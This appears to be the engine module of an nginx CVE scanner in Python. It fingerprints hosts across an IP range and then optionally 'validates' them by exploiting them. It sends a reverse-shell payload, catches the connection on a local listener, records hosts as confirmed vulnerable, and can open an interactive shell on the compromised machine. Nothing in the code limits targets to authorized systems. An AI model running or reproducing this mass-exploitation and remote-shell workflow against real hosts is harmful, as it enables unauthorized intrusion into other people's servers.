"""Scan orchestration: passive fingerprint + optional exploit validation."""

from __future__ import annotations

import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone

from scanner.constants import STATUS_MARKS
from scanner.exploit import (
    ShellCatcher,
    build_reverse_shell_cmd,
    format_scan_command,
    interactive_shell,
    validate_with_reverse_shell,
)
from scanner.http import build_requests, http_probe, probe_to_dict
from scanner.log import get_logger
from scanner.models import (
    STATUSES_ELIGIBLE_FOR_EXPLOIT,
    VULNERABLE_STATUSES,
    HostScanResult,
    ProbeResult,
    ScanConfig,
    VulnStatus,
)
from scanner.targets import expand_targets, parse_ip_range
from scanner.version import classify_vulnerability, classification_to_dict

log = get_logger("engine")


def utc_now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


class Scanner:
    def __init__(self, config: ScanConfig) -> None:
        self.config = config
        self.addresses = parse_ip_range(config.ip_range)
        self.targets = expand_targets(self.addresses, config.ports)
        self.results: list[HostScanResult] = []
        self._results_lock = threading.Lock()
        self.started_at = utc_now_iso()

    def run(self) -> list[HostScanResult]:
        if not self.targets:
            raise ValueError("IP range produced no targets")

        log.info(
            "Target %r — %s IPs, %s host:port pairs, %s threads",
            self.config.ip_range,
            len(self.addresses),
            len(self.targets),
            self.config.threads,
        )
        if self.config.probe_path:
            log.info("Config probe path: %s", self.config.probe_path)
        if self.config.log_file:
            log.info("Writing log to %s", self.config.log_file)

        log.info("Phase 1: passive fingerprint")
        self._run_passive()

        if self.config.exploit_validate:
            self._run_exploit_validation()

        self.results.sort(key=lambda r: (r.ip, r.port))
        vuln_count = len(self.vulnerable_results())
        log.info("Scan finished — %s vulnerable", vuln_count)
        return self.results

    def vulnerable_results(self) -> list[HostScanResult]:
        return [r for r in self.results if r.status in VULNERABLE_STATUSES]

    def result_to_report_row(self, row: HostScanResult) -> dict:
        entry: dict = {
            "ip": row.ip,
            "port": row.port,
            "status": row.status,
        }
        version = row.classification.get("version")
        if version:
            entry["nginx_version"] = version
        if row.exploit.get("success"):
            entry["confirmed"] = True
            peer = row.exploit.get("shell_peer")
            if peer:
                entry["shell_peer"] = peer
        if self.config.shell and row.exploit.get("shell_command"):
            entry["shell_command"] = row.exploit["shell_command"]
        return entry

    def build_report(self) -> dict:
        vuln_rows = self.vulnerable_results()
        return {
            "cve": self.config.cve_id,
            "target": self.config.ip_range,
            "scanned_at": self.started_at,
            "total_vulnerable": len(vuln_rows),
            "vulnerable": [self.result_to_report_row(r) for r in vuln_rows],
        }

    def write_report(self) -> None:
        with open(self.config.output, "w", encoding="utf-8") as fh:
            json.dump(self.build_report(), fh, indent=2)
            fh.write("\n")
        log.info("Report saved: %s", self.config.output)

    def scan_host(self, ip: str, port: int) -> HostScanResult:
        scanned_at = utc_now_iso()
        probes: dict[str, ProbeResult] = {}
        latencies: list[float] = []
        reachable = False

        for name, (req, path) in build_requests(ip, self.config.probe_path).items():
            conn_ok, probe, latency = http_probe(
                ip,
                port,
                req,
                path,
                self.config.connect_timeout,
                self.config.read_timeout,
            )
            probes[name] = probe
            if conn_ok:
                reachable = True
            if latency is not None:
                latencies.append(latency)
            log.debug(
                "Probe %s %s:%s %s — status=%s server=%s",
                name,
                ip,
                port,
                path,
                probe.status_code,
                probe.server_header,
            )

        try:
            classification = classify_vulnerability(probes, self.config.probe_path)
            status = classification.status.value
            classification_dict = classification_to_dict(classification)
        except Exception as exc:
            log.exception("Classification failed for %s:%s", ip, port)
            return HostScanResult(
                ip=ip,
                port=port,
                status=VulnStatus.ERROR.value,
                open=reachable,
                latency_ms=min(latencies) if latencies else None,
                probes={k: probe_to_dict(v) for k, v in probes.items()},
                classification={"error": str(exc)},
                error=str(exc),
                scanned_at=scanned_at,
            )

        return HostScanResult(
            ip=ip,
            port=port,
            status=status,
            open=reachable,
            latency_ms=round(min(latencies), 2) if latencies else None,
            probes={k: probe_to_dict(v) for k, v in probes.items()},
            classification=classification_dict,
            scanned_at=scanned_at,
        )

    def _log_scan_result(self, row: HostScanResult) -> None:
        ver = row.classification.get("version") or "-"
        mark = STATUS_MARKS.get(row.status, "[ ]")
        msg = f"{mark} {row.ip}:{row.port} -> {row.status} (nginx {ver})"
        if row.status == VulnStatus.CONFIRMED_VULNERABLE.value:
            log.warning(msg)
        elif row.status in VULNERABLE_STATUSES:
            log.warning(msg)
        elif row.status == VulnStatus.DOWN.value:
            log.debug(msg)
        else:
            log.info(msg)

    def _run_passive(self) -> None:
        def worker(ip: str, port: int) -> HostScanResult:
            row = self.scan_host(ip, port)
            if not self.config.quiet:
                self._log_scan_result(row)
            with self._results_lock:
                self.results.append(row)
            return row

        with ThreadPoolExecutor(max_workers=self.config.threads) as pool:
            futures = [pool.submit(worker, ip, port) for ip, port in self.targets]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    log.exception("Worker failed")

    def _run_exploit_validation(self) -> None:
        bind_host = "0.0.0.0"
        catcher = ShellCatcher(bind_host, self.config.listen_port)
        try:
            catcher.start()
        except OSError as exc:
            raise OSError(
                f"cannot bind shell listener on {bind_host}:{self.config.listen_port}: {exc}"
            ) from exc

        log.info(
            "Phase 2: reverse-shell validation — listen 0.0.0.0:%s, callback %s:%s",
            self.config.listen_port,
            self.config.listen_ip,
            self.config.listen_port,
        )
        if self.config.shell:
            log.info(format_scan_command(
                self.config.ip_range, self.config.listen_ip, self.config.listen_port,
            ))
            log.debug(
                "Payload: %s",
                build_reverse_shell_cmd(self.config.listen_ip, self.config.listen_port),
            )

        rows = [
            row
            for row in self.results
            if row.open
            and (
                self.config.validate_all_open
                or row.status in STATUSES_ELIGIBLE_FOR_EXPLOIT
            )
        ]
        log.info("Exploit validation queued for %s host(s)", len(rows))

        for row in rows:
            exploit_port = (
                self.config.exploit_port
                if self.config.exploit_port is not None
                else row.port
            )
            log.info("Exploiting %s:%s (scanned port %s)", row.ip, exploit_port, row.port)

            meta = validate_with_reverse_shell(
                row.ip,
                exploit_port,
                self.config.listen_ip,
                self.config.listen_port,
                catcher,
                self.config.exploit_tries,
                self.config.exploit_max_offsets,
                self.config.shell_wait,
                self.config.connect_timeout,
            )
            row.exploit = meta
            if meta.get("success"):
                row.status = VulnStatus.CONFIRMED_VULNERABLE.value
                row.classification["exploit_confirmed"] = True
                row.classification["reasons"] = [
                    f"reverse shell from {meta['shell_peer']}",
                    *row.classification.get("reasons", [])[:5],
                ]
                peer = meta.get("shell_peer", "?")
                log.warning("CONFIRMED %s:%s — reverse shell from %s", row.ip, exploit_port, peer)
                if self.config.shell:
                    meta["shell_command"] = build_reverse_shell_cmd(
                        self.config.listen_ip, self.config.listen_port
                    )
                    log.info("Shell command: %s", meta["shell_command"])

                if self.config.interactive_shell:
                    conn = catcher.take_connection()
                    catcher.stop()
                    if conn is not None:
                        interactive_shell(conn, peer)
                    return

            err = meta.get("error") or "no reverse shell"
            log.info("Not exploited %s:%s (%s)", row.ip, exploit_port, err)

        catcher.stop()
